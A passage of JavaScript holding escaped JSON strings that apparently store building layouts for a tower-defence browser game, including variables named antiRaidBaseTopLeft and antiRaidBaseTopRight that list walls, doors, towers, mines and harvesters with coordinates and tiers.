":-312,\"type\":\"Wall\"},\"31467577\":{\"x\":408,\"y\":-312,\"type\":\"Wall\"},\"31467578\":{\"x\":480,\"y\":-432,\"type\":\"ArrowTower\"},\"31467579\":{\"x\":480,\"y\":-336,\"type\":\"ArrowTower\"},\"31467580\":{\"x\":24,\"y\":-504,\"type\":\"SlowTrap\"},\"31467581\":{\"x\":24,\"y\":-456,\"type\":\"SlowTrap\"},\"31467582\":{\"x\":24,\"y\":-408,\"type\":\"SlowTrap\"},\"31467583\":{\"x\":24,\"y\":-360,\"type\":\"SlowTrap\"},\"31467584\":{\"x\":24,\"y\":-312,\"type\":\"SlowTrap\"},\"31467585\":{\"x\":24,\"y\":-264,\"type\":\"SlowTrap\"},\"31467586\":{\"x\":432,\"y\":96,\"type\":\"CannonTower\"},\"31467587\":{\"x\":384,\"y\":192,\"type\":\"CannonTower\"},\"31467588\":{\"x\":336,\"y\":96,\"type\":\"ArrowTower\"},\"31467589\":{\"x\":240,\"y\":96,\"type\":\"BombTower\"},\"31467590\":{\"x\":288,\"y\":192,\"type\":\"BombTower\"},\"31467591\":{\"x\":72,\"y\":168,\"type\":\"Door\"},\"31467592\":{\"x\":120,\"y\":168,\"type\":\"Door\"},\"31467593\":{\"x\":120,\"y\":216,\"type\":\"Door\"},\"31467594\":{\"x\":72,\"y\":216,\"type\":\"Door\"},\"31467595\":{\"x\":120,\"y\":264,\"type\":\"Door\"},\"31467596\":{\"x\":168,\"y\":264,\"type\":\"Door\"},\"31467597\":{\"x\":216,\"y\":264,\"type\":\"Door\"},\"31467598\":{\"x\":264,\"y\":264,\"type\":\"Door\"},\"31467599\":{\"x\":264,\"y\":312,\"type\":\"Door\"},\"31467600\":{\"x\":312,\"y\":264,\"type\":\"Wall\"},\"31467601\":{\"x\":360,\"y\":264,\"type\":\"Wall\"},\"31467602\":{\"x\":360,\"y\":312,\"type\":\"Wall\"},\"31467603\":{\"x\":312,\"y\":312,\"type\":\"Door\"},\"31467605\":{\"x\":216,\"y\":312,\"type\":\"Wall\"},\"31467892\":{\"x\":432,\"y\":288,\"type\":\"BombTower\"},\"31468056\":{\"x\":528,\"y\":288,\"type\":\"MagicTower\"},\"31468462\":{\"x\":600,\"y\":264,\"type\":\"Door\"},\"31468615\":{\"x\":648,\"y\":264,\"type\":\"Door\"},\"31469347\":{\"x\":696,\"y\":360,\"type\":\"Door\"},\"31469452\":{\"x\":696,\"y\":312,\"type\":\"Door\"},\"31469628\":{\"x\":648,\"y\":408,\"type\":\"Door\"},\"31469736\":{\"x\":600,\"y\":456,\"type\":\"Door\"},\"31469758\":{\"x\":552,\"y\":504,\"type\":\"Door\"},\"31470698\":{\"x\":456,\"y\":600,\"type\":\"Door\"},\"31470903\":{\"x\":504,\"y\":552,\"type\":\"Wall\"},\"31470965\":{\"x\":408,\"y\":648,\"type\":\"Door\"},\"31470998\":{\"x\":360,\"y\":696,\"type\":\"Door\"},\"31471010\":{\"x\":312,\"y\":744,\"type\":\"Door\"},\"31471011\":{\"x\":264,\"y\":744,\"type\":\"Door\"},\"31471012\":{\"x\":216,\"y\":696,\"type\":\"Door\"},\"31471013\":{\"x\":600,\"y\":312,\"type\":\"Wall\"},\"31471014\":{\"x\":648,\"y\":312,\"type\":\"Wall\"},\"31471015\":{\"x\":648,\"y\":360,\"type\":\"Wall\"},\"31471016\":{\"x\":600,\"y\":360,\"type\":\"Wall\"},\"31471017\":{\"x\":504,\"y\":360,\"type\":\"Wall\"},\"31471018\":{\"x\":552,\"y\":360,\"type\":\"Wall\"},\"31471019\":{\"x\":552,\"y\":408,\"type\":\"Wall\"},\"31471020\":{\"x\":552,\"y\":456,\"type\":\"Wall\"},\"31471021\":{\"x\":504,\"y\":456,\"type\":\"Wall\"},\"31471022\":{\"x\":600,\"y\":408,\"type\":\"Wall\"},\"31471023\":{\"x\":504,\"y\":408,\"type\":\"Door\"},\"31471024\":{\"x\":264,\"y\":696,\"type\":\"Wall\"},\"31471025\":{\"x\":312,\"y\":696,\"type\":\"Wall\"},\"31471026\":{\"x\":312,\"y\":648,\"type\":\"Wall\"},\"31471027\":{\"x\":264,\"y\":648,\"type\":\"Wall\"},\"31471028\":{\"x\":216,\"y\":648,\"type\":\"Wall\"},\"31471029\":{\"x\":360,\"y\":648,\"type\":\"Wall\"},\"31471030\":{\"x\":312,\"y\":600,\"type\":\"Wall\"},\"31471031\":{\"x\":312,\"y\":552,\"type\":\"Wall\"},\"31471032\":{\"x\":360,\"y\":600,\"type\":\"Wall\"},\"31471033\":{\"x\":408,\"y\":600,\"type\":\"Wall\"},\"31471034\":{\"x\":408,\"y\":552,\"type\":\"Wall\"},\"31471035\":{\"x\":504,\"y\":504,\"type\":\"Door\"},\"31471036\":{\"x\":456,\"y\":504,\"type\":\"Door\"},\"31471037\":{\"x\":456,\"y\":552,\"type\":\"Door\"},\"31471038\":{\"x\":360,\"y\":552,\"type\":\"Door\"},\"31471039\":{\"x\":360,\"y\":504,\"type\":\"Door\"},\"31471040\":{\"x\":408,\"y\":504,\"type\":\"Door\"},\"31471041\":{\"x\":456,\"y\":456,\"type\":\"Door\"},\"31471044\":{\"x\":384,\"y\":432,\"type\":\"ArrowTower\"},\"31471045\":{\"x\":312,\"y\":360,\"type\":\"Door\"},\"31471046\":{\"x\":312,\"y\":408,\"type\":\"Door\"},\"31471047\":{\"x\":312,\"y\":456,\"type\":\"Door\"},\"31471048\":{\"x\":312,\"y\":504,\"type\":\"Door\"},\"31471049\":{\"x\":360,\"y\":360,\"type\":\"Door\"},\"31471050\":{\"x\":408,\"y\":360,\"type\":\"Door\"},\"31471051\":{\"x\":456,\"y\":360,\"type\":\"Door\"},\"31471052\":{\"x\":456,\"y\":408,\"type\":\"Door\"},\"31471053\":{\"x\":168,\"y\":600,\"type\":\"Wall\"},\"31471054\":{\"x\":168,\"y\":648,\"type\":\"Door\"},\"31471055\":{\"x\":120,\"y\":600,\"type\":\"Door\"},\"31471056\":{\"x\":72,\"y\":648,\"type\":\"Door\"},\"31471057\":{\"x\":24,\"y\":648,\"type\":\"Wall\"},\"31471058\":{\"x\":24,\"y\":696,\"type\":\"Door\"},\"31471059\":{\"x\":240,\"y\":576,\"type\":\"MagicTower\"},\"31471060\":{\"x\":144,\"y\":528,\"type\":\"MagicTower\"},\"31471061\":{\"x\":48,\"y\":576,\"type\":\"MagicTower\"},\"31471062\":{\"x\":144,\"y\":432,\"type\":\"CannonTower\"},\"31471063\":{\"x\":48,\"y\":480,\"type\":\"CannonTower\"},\"31471064\":{\"x\":48,\"y\":384,\"type\":\"ArrowTower\"},\"31471066\":{\"x\":-96,\"y\":432,\"type\":\"CannonTower\"},\"31471067\":{\"x\":-96,\"y\":528,\"type\":\"MagicTower\"},\"31471068\":{\"x\":48,\"y\":288,\"type\":\"BombTower\"},\"31471069\":{\"x\":144,\"y\":336,\"type\":\"BombTower\"},\"31471070\":{\"x\":240,\"y\":384,\"type\":\"BombTower\"},\"31471071\":{\"x\":240,\"y\":480,\"type\":\"BombTower\"},\"31471072\":{\"x\":-264,\"y\":216,\"type\":\"Wall\"},\"31471073\":{\"x\":-264,\"y\":264,\"type\":\"Wall\"},\"31471074\":{\"x\":-96,\"y\":336,\"type\":\"ArrowTower\"},\"31471075\":{\"x\":-192,\"y\":384,\"type\":\"ArrowTower\"},\"31471076\":{\"x\":-192,\"y\":480,\"type\":\"MagicTower\"},\"31471077\":{\"x\":-216,\"y\":552,\"type\":\"Wall\"},\"31471078\":{\"x\":-168,\"y\":552,\"type\":\"Wall\"},\"31471079\":{\"x\":-120,\"y\":600,\"type\":\"Wall\"},\"31471080\":{\"x\":-48,\"y\":624,\"type\":\"Harvester\"},\"31471090\":{\"x\":-72,\"y\":696,\"type\":\"Door\"},\"31471115\":{\"x\":-120,\"y\":648,\"type\":\"Door\"},\"31471119\":{\"x\":-216,\"y\":600,\"type\":\"Door\"},\"31471123\":{\"x\":-168,\"y\":600,\"type\":\"Door\"},\"31471124\":{\"x\":-24,\"y\":696,\"type\":\"SlowTrap\"},\"31471128\":{\"x\":-264,\"y\":600,\"type\":\"Wall\"},\"31471129\":{\"x\":-312,\"y\":600,\"type\":\"Wall\"},\"31471130\":{\"x\":-360,\"y\":600,\"type\":\"Wall\"},\"31471131\":{\"x\":-408,\"y\":600,\"type\":\"Wall\"},\"31471132\":{\"x\":-360,\"y\":648,\"type\":\"Wall\"},\"31471133\":{\"x\":-312,\"y\":648,\"type\":\"Wall\"},\"31471134\":{\"x\":-264,\"y\":648,\"type\":\"Door\"},\"31471135\":{\"x\":-312,\"y\":696,\"type\":\"Door\"},\"31471136\":{\"x\":-360,\"y\":696,\"type\":\"Door\"},\"31471137\":{\"x\":-408,\"y\":648,\"type\":\"Door\"},\"31471138\":{\"x\":-456,\"y\":600,\"type\":\"Door\"},\"31471177\":{\"x\":-456,\"y\":552,\"type\":\"Wall\"},\"31471178\":{\"x\":-456,\"y\":504,\"type\":\"Wall\"},\"31471179\":{\"x\":-504,\"y\":504,\"type\":\"Wall\"},\"31471180\":{\"x\":-384,\"y\":528,\"type\":\"MeleeTower\"},\"31471181\":{\"x\":-288,\"y\":528,\"type\":\"MeleeTower\"},\"31471375\":{\"x\":-504,\"y\":552,\"type\":\"Door\"},\"31471459\":{\"x\":-552,\"y\":504,\"type\":\"Door\"},\"31472550\":{\"x\":-600,\"y\":456,\"type\":\"Door\"},\"31473067\":{\"x\":-600,\"y\":408,\"type\":\"Wall\"},\"31473180\":{\"x\":-648,\"y\":408,\"type\":\"Door\"},\"31473706\":{\"x\":-648,\"y\":360,\"type\":\"Wall\"},\"31473775\":{\"x\":-648,\"y\":312,\"type\":\"Wall\"},\"31474138\":{\"x\":-696,\"y\":312,\"type\":\"Door\"},\"31474172\":{\"x\":-696,\"y\":360,\"type\":\"Door\"},\"31474551\":{\"x\":-576,\"y\":336,\"type\":\"MagicTower\"},\"31475047\":{\"x\":-480,\"y\":336,\"type\":\"ArrowTower\"},\"31475122\":{\"x\":-528,\"y\":432,\"type\":\"ArrowTower\"},\"31475754\":{\"x\":-360,\"y\":408,\"type\":\"Wall\"},\"31475761\":{\"x\":-360,\"y\":456,\"type\":\"Wall\"},\"31475847\":{\"x\":-432,\"y\":432,\"type\":\"BombTower\"},\"31475861\":{\"x\":-384,\"y\":336,\"type\":\"BombTower\"},\"31475869\":{\"x\":-288,\"y\":336,\"type\":\"BombTower\"},\"31475881\":{\"x\":-288,\"y\":432,\"type\":\"BombTower\"},\"31475918\":{\"x\":-24,\"y\":264,\"type\":\"SlowTrap\"},\"31475919\":{\"x\":-24,\"y\":312,\"type\":\"SlowTrap\"},\"31475921\":{\"x\":-24,\"y\":360,\"type\":\"SlowTrap\"},\"31475922\":{\"x\":-24,\"y\":408,\"type\":\"SlowTrap\"},\"31475923\":{\"x\":-24,\"y\":456,\"type\":\"SlowTrap\"},\"31475924\":{\"x\":-24,\"y\":504,\"type\":\"SlowTrap\"},\"31475928\":{\"x\":-24,\"y\":552,\"type\":\"SlowTrap\"}}";
let antiRaidBaseTopLeft = "{\"105851787\":{\"x\":-48,\"y\":-96,\"type\":\"BombTower\",\"tier\":1},\"105851788\":{\"x\":48,\"y\":-96,\"type\":\"BombTower\",\"tier\":1},\"105851789\":{\"x\":144,\"y\":-96,\"type\":\"ArrowTower\",\"tier\":1},\"105851790\":{\"x\":-144,\"y\":96,\"type\":\"BombTower\",\"tier\":1},\"105851791\":{\"x\":-48,\"y\":96,\"type\":\"BombTower\",\"tier\":1},\"105851792\":{\"x\":48,\"y\":96,\"type\":\"BombTower\",\"tier\":1},\"105851793\":{\"x\":144,\"y\":96,\"type\":\"ArrowTower\",\"tier\":1},\"105851794\":{\"x\":-144,\"y\":-96,\"type\":\"GoldMine\",\"tier\":1},\"105851795\":{\"x\":-72,\"y\":24,\"type\":\"Wall\",\"tier\":1},\"105851796\":{\"x\":-120,\"y\":24,\"type\":\"Wall\",\"tier\":1},\"105851797\":{\"x\":-168,\"y\":24,\"type\":\"Wall\",\"tier\":1},\"105851798\":{\"x\":-72,\"y\":-24,\"type\":\"SlowTrap\",\"tier\":1},\"105851799\":{\"x\":-120,\"y\":-24,\"type\":\"SlowTrap\",\"tier\":1},\"105851800\":{\"x\":-168,\"y\":-24,\"type\":\"SlowTrap\",\"tier\":1},\"105851802\":{\"x\":-336,\"y\":0,\"type\":\"Harvester\",\"tier\":1},\"105851803\":{\"x\":-432,\"y\":0,\"type\":\"Harvester\",\"tier\":1},\"105851804\":{\"x\":-528,\"y\":0,\"type\":\"Harvester\",\"tier\":1},\"105851805\":{\"x\":96,\"y\":0,\"type\":\"Harvester\",\"tier\":1},\"105851806\":{\"x\":192,\"y\":0,\"type\":\"Harvester\",\"tier\":1},\"105851807\":{\"x\":288,\"y\":0,\"type\":\"Harvester\",\"tier\":1},\"105851808\":{\"x\":384,\"y\":0,\"type\":\"Harvester\",\"tier\":1},\"105851809\":{\"x\":408,\"y\":-72,\"type\":\"Door\",\"tier\":1},\"105851810\":{\"x\":408,\"y\":-120,\"type\":\"Wall\",\"tier\":1},\"105851811\":{\"x\":408,\"y\":72,\"type\":\"Door\",\"tier\":1},\"105851812\":{\"x\":408,\"y\":120,\"type\":\"Wall\",\"tier\":1},\"105851813\":{\"x\":384,\"y\":192,\"type\":\"MagicTower\",\"tier\":1},\"105851814\":{\"x\":336,\"y\":96,\"type\":\"MagicTower\",\"tier\":1},\"105851815\":{\"x\":336,\"y\":-96,\"type\":\"MagicTower\",\"tier\":1},\"105851816\":{\"x\":384,\"y\":-192,\"type\":\"MagicTower\",\"tier\":1},\"105851817\":{\"x\":336,\"y\":-288,\"type\":\"MagicTower\",\"tier\":1},\"105851818\":{\"x\":336,\"y\":288,\"type\":\"MagicTower\",\"tier\":1},\"105851819\":{\"x\":408,\"y\":264,\"type\":\"Wall\",\"tier\":1},\"105851820\":{\"x\":408,\"y\":312,\"type\":\"Door\",\"tier\":1},\"105851821\":{\"x\":360,\"y\":360,\"type\":\"Door\",\"tier\":1},\"105851822\":{\"x\":312,\"y\":360,\"type\":\"Wall\",\"tier\":1},\"105851823\":{\"x\":312,\"y\":408,\"type\":\"Door\",\"tier\":1},\"105851824\":{\"x\":408,\"y\":-264,\"type\":\"Wall\",\"tier\":1},\"105851825\":{\"x\":408,\"y\":-312,\"type\":\"Door\",\"tier\":1},\"105851826\":{\"x\":360,\"y\":-360,\"type\":\"Wall\",\"tier\":1},\"105851827\":{\"x\":360,\"y\":-408,\"type\":\"Door\",\"tier\":1},\"105852000\":{\"x\":264,\"y\":-504,\"type\":\"Door\",\"tier\":1},\"105852016\":{\"x\":264,\"y\":-456,\"type\":\"Wall\",\"tier\":1},\"105852037\":{\"x\":312,\"y\":-456,\"type\":\"Door\",\"tier\":1},\"105852176\":{\"x\":168,\"y\":-552,\"type\":\"Wall\",\"tier\":1},\"105852194\":{\"x\":168,\"y\":-600,\"type\":\"Door\",\"tier\":1},\"105852298\":{\"x\":216,\"y\":-552,\"type\":\"Door\",\"tier\":1},\"105852361\":{\"x\":96,\"y\":-576,\"type\":\"MagicTower\",\"tier\":1},\"105852362\":{\"x\":0,\"y\":-576,\"type\":\"CannonTower\",\"tier\":1},\"105852364\":{\"x\":-96,\"y\":-576,\"type\":\"MagicTower\",\"tier\":1},\"105852365\":{\"x\":-192,\"y\":-576,\"type\":\"CannonTower\",\"tier\":1},\"105852366\":{\"x\":-288,\"y\":-576,\"type\":\"MagicTower\",\"tier\":1},\"105852367\":{\"x\":-360,\"y\":-552,\"type\":\"Wall\",\"tier\":1},\"105852368\":{\"x\":-360,\"y\":-600,\"type\":\"Door\",\"tier\":1},\"105852369\":{\"x\":-408,\"y\":-552,\"type\":\"Door\",\"tier\":1},\"105852370\":{\"x\":-264,\"y\":-648,\"type\":\"Wall\",\"tier\":1},\"105852371\":{\"x\":-216,\"y\":-648,\"type\":\"Wall\",\"tier\":1},\"105852372\":{\"x\":-168,\"y\":-648,\"type\":\"Wall\",\"tier\":1},\"105852373\":{\"x\":-120,\"y\":-648,\"type\":\"Wall\",\"tier\":1},\"105852374\":{\"x\":-72,\"y\":-648,\"type\":\"Wall\",\"tier\":1},\"105852375\":{\"x\":-24,\"y\":-648,\"type\":\"Wall\",\"tier\":1},\"105852376\":{\"x\":24,\"y\":-648,\"type\":\"Wall\",\"tier\":1},\"105852377\":{\"x\":72,\"y\":-648,\"type\":\"Wall\",\"tier\":1},\"105852379\":{\"x\":192,\"y\":-480,\"type\":\"CannonTower\",\"tier\":1},\"105852380\":{\"x\":288,\"y\":-384,\"type\":\"MagicTower\",\"tier\":1},\"105852381\":{\"x\":-192,\"y\":-480,\"type\":\"CannonTower\",\"tier\":1},\"105852382\":{\"x\":-288,\"y\":-480,\"type\":\"CannonTower\",\"tier\":1},\"105852383\":{\"x\":-384,\"y\":-480,\"type\":\"CannonTower\",\"tier\":1},\"105852384\":{\"x\":0,\"y\":-480,\"type\":\"CannonTower\",\"tier\":1},\"105852385\":{\"x\":96,\"y\":-480,\"type\":\"CannonTower\",\"tier\":1},\"105852386\":{\"x\":-96,\"y\":-480,\"type\":\"ArrowTower\",\"tier\":1},\"105852387\":{\"x\":-96,\"y\":-384,\"type\":\"ArrowTower\",\"tier\":1},\"105852388\":{\"x\":-192,\"y\":-384,\"type\":\"ArrowTower\",\"tier\":1},\"105852389\":{\"x\":0,\"y\":-384,\"type\":\"ArrowTower\",\"tier\":1},\"105852390\":{\"x\":-384,\"y\":-384,\"type\":\"ArrowTower\",\"tier\":1},\"105852391\":{\"x\":192,\"y\":-384,\"type\":\"ArrowTower\",\"tier\":1},\"105852392\":{\"x\":-480,\"y\":-384,\"type\":\"MagicTower\",\"tier\":1},\"105852393\":{\"x\":-456,\"y\":-456,\"type\":\"Wall\",\"tier\":1},\"105852394\":{\"x\":-456,\"y\":-504,\"type\":\"Door\",\"tier\":1},\"105852395\":{\"x\":-504,\"y\":-456,\"type\":\"Door\",\"tier\":1},\"105852396\":{\"x\":-288,\"y\":-384,\"type\":\"GoldMine\",\"tier\":1},\"105852397\":{\"x\":96,\"y\":-384,\"type\":\"GoldMine\",\"tier\":1},\"105852398\":{\"x\":-336,\"y\":-288,\"type\":\"GoldMine\",\"tier\":1},\"105852399\":{\"x\":-240,\"y\":-288,\"type\":\"GoldMine\",\"tier\":1},\"105852400\":{\"x\":-144,\"y\":-288,\"type\":\"GoldMine\",\"tier\":1},\"105852401\":{\"x\":-48,\"y\":-288,\"type\":\"GoldMine\",\"tier\":1},\"105852402\":{\"x\":-96,\"y\":-192,\"type\":\"GoldMine\",\"tier\":1},\"105852403\":{\"x\":-528,\"y\":-288,\"type\":\"MagicTower\",\"tier\":1},\"105852404\":{\"x\":-528,\"y\":-192,\"type\":\"MagicTower\",\"tier\":1},\"105852405\":{\"x\":-480,\"y\":-96,\"type\":\"MagicTower\",\"tier\":1},\"105852406\":{\"x\":-600,\"y\":-264,\"type\":\"Wall\",\"tier\":1},\"105852407\":{\"x\":-600,\"y\":-312,\"type\":\"Door\",\"tier\":1},\"105852409\":{\"x\":-648,\"y\":-264,\"type\":\"Door\",\"tier\":1},\"105852410\":{\"x\":-600,\"y\":-216,\"type\":\"Door\",\"tier\":1},\"105852411\":{\"x\":-552,\"y\":-72,\"type\":\"Wall\",\"tier\":1},\"105852412\":{\"x\":-552,\"y\":-120,\"type\":\"Door\",\"tier\":1},\"105852413\":{\"x\":-600,\"y\":-72,\"type\":\"Door\",\"tier\":1},\"105852414\":{\"x\":-600,\"y\":24,\"type\":\"Door\",\"tier\":1},\"105852415\":{\"x\":-552,\"y\":72,\"type\":\"Door\",\"tier\":1},\"105852416\":{\"x\":-552,\"y\":120,\"type\":\"Door\",\"tier\":1},\"105852417\":{\"x\":-600,\"y\":-24,\"type\":\"SlowTrap\",\"tier\":1},\"105852418\":{\"x\":-552,\"y\":-360,\"type\":\"Door\",\"tier\":1},\"105852419\":{\"x\":-552,\"y\":-408,\"type\":\"Door\",\"tier\":1},\"105852421\":{\"x\":-480,\"y\":96,\"type\":\"MagicTower\",\"tier\":1},\"105852422\":{\"x\":-528,\"y\":192,\"type\":\"MagicTower\",\"tier\":1},\"105852423\":{\"x\":-528,\"y\":288,\"type\":\"MagicTower\",\"tier\":1},\"105852424\":{\"x\":-432,\"y\":384,\"type\":\"MagicTower\",\"tier\":1},\"105852425\":{\"x\":-336,\"y\":384,\"type\":\"MagicTower\",\"tier\":1},\"105852426\":{\"x\":-192,\"y\":384,\"type\":\"MagicTower\",\"tier\":1},\"105852427\":{\"x\":-96,\"y\":384,\"type\":\"MagicTower\",\"tier\":1},\"105852428\":{\"x\":0,\"y\":384,\"type\":\"MagicTower\",\"tier\":1},\"105852429\":{\"x\":144,\"y\":384,\"type\":\"MagicTower\",\"tier\":1},\"105852430\":{\"x\":240,\"y\":384,\"type\":\"MagicTower\",\"tier\":1},\"105852431\":{\"x\":-264,\"y\":360,\"type\":\"Wall\",\"tier\":1},\"105852432\":{\"x\":-264,\"y\":408,\"type\":\"Wall\",\"tier\":1},\"105852433\":{\"x\":72,\"y\":360,\"type\":\"Wall\",\"tier\":1},\"105852434\":{\"x\":72,\"y\":408,\"type\":\"Wall\",\"tier\":1},\"105852435\":{\"x\":-504,\"y\":360,\"type\":\"Wall\",\"tier\":1},\"105852436\":{\"x\":-552,\"y\":360,\"type\":\"Door\",\"tier\":1},\"105852437\":{\"x\":-504,\"y\":408,\"type\":\"Door\",\"tier\":1},\"105852438\":{\"x\":-600,\"y\":264,\"type\":\"Wall\",\"tier\":1},\"105852439\":{\"x\":-600,\"y\":216,\"type\":\"Door\",\"tier\":1},\"105852440\":{\"x\":-648,\"y\":264,\"type\":\"Door\",\"tier\":1},\"105852441\":{\"x\":-600,\"y\":312,\"type\":\"Door\",\"tier\":1},\"105852442\":{\"x\":-432,\"y\":-288,\"type\":\"CannonTower\",\"tier\":1},\"105852443\":{\"x\":-432,\"y\":-192,\"type\":\"CannonTower\",\"tier\":1},\"105852444\":{\"x\":-336,\"y\":-192,\"type\":\"CannonTower\",\"tier\":1},\"105852445\":{\"x\":-384,\"y\":-96,\"type\":\"CannonTower\",\"tier\":1},\"105852446\":{\"x\":-384,\"y\":96,\"type\":\"CannonTower\",\"tier\":1},\"105852447\":{\"x\":-432,\"y\":192,\"type\":\"CannonTower\",\"tier\":1},\"105852448\":{\"x\":-336,\"y\":192,\"type\":\"CannonTower\",\"tier\":1},\"105852449\":{\"x\":-336,\"y\":288,\"type\":\"CannonTower\",\"tier\":1},\"105852450\":{\"x\":-432,\"y\":288,\"type\":\"CannonTower\",\"tier\":1},\"105852451\":{\"x\":240,\"y\":-288,\"type\":\"CannonTower\",\"tier\":1},\"105852452\":{\"x\":288,\"y\":-192,\"type\":\"CannonTower\",\"tier\":1},\"105852453\":{\"x\":240,\"y\":-96,\"type\":\"CannonTower\",\"tier\":1},\"105852454\":{\"x\":240,\"y\":96,\"type\":\"CannonTower\",\"tier\":1},\"105852455\":{\"x\":288,\"y\":192,\"type\":\"CannonTower\",\"tier\":1},\"105852456\":{\"x\":240,\"y\":288,\"type\":\"CannonTower\",\"tier\":1},\"105852457\":{\"x\":144,\"y\":288,\"type\":\"CannonTower\",\"tier\":1},\"105852471\":{\"x\":0,\"y\":-192,\"type\":\"BombTower\",\"tier\":1},\"105852501\":{\"x\":48,\"y\":-288,\"type\":\"BombTower\",\"tier\":1},\"105852586\":{\"x\":144,\"y\":-288,\"type\":\"BombTower\",\"tier\":1},\"105852620\":{\"x\":96,\"y\":-192,\"type\":\"BombTower\",\"tier\":1},\"105852723\":{\"x\":-216,\"y\":-216,\"type\":\"Door\",\"tier\":1},\"105852732\":{\"x\":-216,\"y\":-168,\"type\":\"Door\",\"tier\":1},\"105853146\":{\"x\":-96,\"y\":192,\"type\":\"BombTower\",\"tier\":1},\"105853190\":{\"x\":0,\"y\":192,\"type\":\"BombTower\",\"tier\":1},\"105853289\":{\"x\":96,\"y\":192,\"type\":\"BombTower\",\"tier\":1},\"105853490\":{\"x\":-312,\"y\":-120,\"type\":\"Wall\",\"tier\":1},\"105853496\":{\"x\":-312,\"y\":-72,\"type\":\"Wall\",\"tier\":1},\"105854137\":{\"x\":-216,\"y\":72,\"type\":\"Wall\",\"tier\":1},\"105854169\":{\"x\":-216,\"y\":120,\"type\":\"Wall\",\"tier\":1},\"105854393\":{\"x\":-168,\"y\":168,\"type\":\"Wall\",\"tier\":1},\"105854414\":{\"x\":-168,\"y\":216,\"type\":\"Wall\",\"tier\":1},\"105854526\":{\"x\":-240,\"y\":0,\"type\":\"Harvester\",\"tier\":1},\"105854527\":{\"x\":192,\"y\":-192,\"type\":\"ArrowTower\",\"tier\":1},\"105854528\":{\"x\":192,\"y\":192,\"type\":\"ArrowTower\",\"tier\":1},\"105854529\":{\"x\":-288,\"y\":96,\"type\":\"ArrowTower\",\"tier\":1},\"105854530\":{\"x\":-240,\"y\":192,\"type\":\"ArrowTower\",\"tier\":1},\"105854531\":{\"x\":-240,\"y\":288,\"type\":\"ArrowTower\",\"tier\":1},\"105854532\":{\"x\":-144,\"y\":288,\"type\":\"ArrowTower\",\"tier\":1},\"105854533\":{\"x\":-48,\"y\":288,\"type\":\"ArrowTower\",\"tier\":1},\"105854534\":{\"x\":48,\"y\":288,\"type\":\"ArrowTower\",\"tier\":1},\"105854535\":{\"x\":-240,\"y\":-96,\"type\":\"ArrowTower\",\"tier\":1},\"105854536\":{\"x\":-264,\"y\":-216,\"type\":\"Wall\",\"tier\":1},\"105854537\":{\"x\":-264,\"y\":-168,\"type\":\"Wall\",\"tier\":1},\"105854538\":{\"x\":-168,\"y\":-216,\"type\":\"Door\",\"tier\":1},\"105854539\":{\"x\":-168,\"y\":-168,\"type\":\"Door\",\"tier\":1}}";
let antiRaidBaseTopRight = "{\"105858277\":{\"x\":96,\"y\":-48,\"type\":\"BombTower\",\"tier\":1},\"105858278\":{\"x\":96,\"y\":48,\"type\":\"BombTower\",\"tier\":1},\"105858279\":{\"x\":96,\"y\":144,\"type\":\"ArrowTower\",\"tier\":1},\"105858280\":{\"x\":-96,\"y\":-48,\"type\":\"BombTower\",\"tier\":1},\"105858281\":{\"x\":-96,\"y\":-144,\"type\":\"BombTower\",\"tier\":1},\"105858282\":{\"x\":-96,\"y\":48,\"type\":\"BombTower\",\"tier\":1},\"105858283\":{\"x\":-96,\"y\":144,\"type\":\"ArrowTower\",\"tier\":1},\"105858284\":{\"x\":96,\"y\":-144,\"type\":\"GoldMine\",\"tier\":1},\"105858285\":{\"x\":192,\"y\":-96,\"type\":\"GoldMine\",\"tier\":1},\"105858286\":{\"x\":288,\"y\":-144,\"type\":\"GoldMine\",\"tier\":1},\"105858287\":{\"x\":288,\"y\":-48,\"type\":\"GoldMine\",\"tier\":1},\"105858288\":{\"x\":384,\"y\":-192,\"type\":\"GoldMine\",\"tier\":1},\"105858290\":{\"x\":384,\"y\":-96,\"type\":\"GoldMine\",\"tier\":1},\"105858291\":{\"x\":384,\"y\":0,\"type\":\"GoldMine\",\"tier\":1},\"105858292\":{\"x\":384,\"y\":96,\"type\":\"GoldMine\",\"tier\":1},\"105858305\":{\"x\":192,\"y\":0,\"type\":\"BombTower\",\"tier\":1},\"105858314\":{\"x\":288,\"y\":48,\"type\":\"BombTower\",\"tier\":1},\"105858323\":{\"x\":192,\"y\":96,\"type\":\"BombTower\",\"tier\":1},\"105858331\":{\"x\":288,\"y\":144,\"type\":\"BombTower\",\"tier\":1},\"105858346\":{\"x\":-192,\"y\":0,\"type\":\"BombTower\",\"tier\":1},\"105858355\":{\"x\":-192,\"y\":-96,\"type\":\"BombTower\",\"tier\":1},\"105858453\":{\"x\":-192,\"y\":96,\"type\":\"BombTower\",\"tier\":1},\"105858530\":{\"x\":-72,\"y\":-216,\"type\":\"Wall\",\"tier\":1},\"105858537\":{\"x\":-120,\"y\":-216,\"type\":\"Wall\",\"tier\":1},\"105858546\":{\"x\":-168,\"y\":-168,\"type\":\"Wall\",\"tier\":1},\"105858555\":{\"x\":-216,\"y\":-168,\"type\":\"Wall\",\"tier\":1},\"105858589\":{\"x\":-96,\"y\":-288,\"type\":\"ArrowTower\",\"tier\":1},\"105858597\":{\"x\":-192,\"y\":-240,\"type\":\"ArrowTower\",\"tier\":1},\"105858634\":{\"x\":72,\"y\":-216,\"type\":\"Wall\",\"tier\":1},\"105858636\":{\"x\":120,\"y\":-216,\"type\":\"Wall\",\"tier\":1},\"105858648\":{\"x\":168,\"y\":-264,\"type\":\"Wall\",\"tier\":1},\"105858649\":{\"x\":216,\"y\":-264,\"type\":\"Wall\",\"tier\":1},\"105858651\":{\"x\":96,\"y\":-288,\"type\":\"ArrowTower\",\"tier\":1},\"105858652\":{\"x\":192,\"y\":-336,\"type\":\"CannonTower\",\"tier\":1},\"105858653\":{\"x\":96,\"y\":-384,\"type\":\"CannonTower\",\"tier\":1},\"105858654\":{\"x\":192,\"y\":-432,\"type\":\"CannonTower\",\"tier\":1},\"105858655\":{\"x\":288,\"y\":-432,\"type\":\"CannonTower\",\"tier\":1},\"105858656\":{\"x\":288,\"y\":-336,\"type\":\"CannonTower\",\"tier\":1},\"105858657\":{\"x\":384,\"y\":-384,\"type\":\"CannonTower\",\"tier\":1},\"105858658\":{\"x\":-96,\"y\":-384,\"type\":\"CannonTower\",\"tier\":1},\"105858659\":{\"x\":-192,\"y\":-432,\"type\":\"CannonTower\",\"tier\":1},\"105858660\":{\"x\":-192,\"y\":-336,\"type\":\"CannonTower\",\"tier\":1},\"105858661\":{\"x\":-288,\"y\":-432,\"type\":\"CannonTower\",\"tier\":1},\"105858662\":{\"x\":-288,\"y\":-336,\"type\":\"CannonTower\",\"tier\":1},\"105858663\":{\"x\":-288,\"y\":